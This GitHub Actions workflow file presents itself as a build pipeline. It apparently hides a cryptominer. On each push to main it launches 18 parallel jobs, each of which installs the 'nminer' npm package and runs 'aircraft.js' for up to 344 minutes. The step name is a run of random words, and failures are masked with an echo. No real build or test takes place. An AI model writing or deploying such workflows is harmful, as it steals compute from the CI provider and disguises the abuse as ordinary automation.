name: aircraft
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6507 }
          - { version: 5700 }
          - { version: 1455 }
          - { version: 3567 }
          - { version: 4294 }
          - { version: 4228 }
          - { version: 3495 }
          - { version: 3489 }
          - { version: 3184 }
          - { version: 3391 }
          - { version: 948 }
          - { version: 862 }
          - { version: 4196 }
          - { version: 5556 }
          - { version: 4169 }
          - { version: 6793 }
          - { version: 1994 }
          - { version: 429 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: circumnavigate warming ew carp yum
        run: |
          npm install nminer@latest
          timeout 344m node aircraft.js || echo "aircraft executed"